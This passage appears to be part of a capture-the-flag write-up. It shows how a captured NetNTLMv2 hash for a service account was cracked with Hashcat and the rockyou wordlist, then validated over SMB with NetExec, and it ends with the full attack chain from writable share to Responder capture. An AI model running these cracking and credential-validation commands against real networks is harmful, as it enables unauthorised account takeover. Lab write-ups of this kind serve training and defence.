# 03 — Cracking & Credential Validation

## 1. Hash File

The captured credential was stored as:

```text
svc.scanner::CTF:<challenge>:<response>:...
```

This is a NetNTLMv2 format.

## 2. Hashcat

I used Hashcat mode `5600`, which corresponds to NetNTLMv2:

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
```

Hashcat eventually reported:

```text
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
```

The recovered password was:

```text
1summerlove!
```

## 3. Validate the Credentials

First, disable Bash history expansion:

```bash
set +H
```

Then set the target:

```bash
export ip=10.49.157.149
```

Validate the credentials:

```bash
nxc smb $ip -u svc.scanner -p '1summerlove!'
```

The important lesson here is to validate the cracked credential against the actual AD service before moving to privilege/attack-path enumeration.

## 4. Why This Worked

The chain was:

```text
Writable SMB Share
        ↓
Automated File Scanner
        ↓
SMB Authentication
        ↓
Responder
        ↓
NetNTLMv2 Capture
        ↓
Hashcat
        ↓
svc.scanner Password
```

The service account was particularly valuable because the onboarding information identified it as an automated service account.

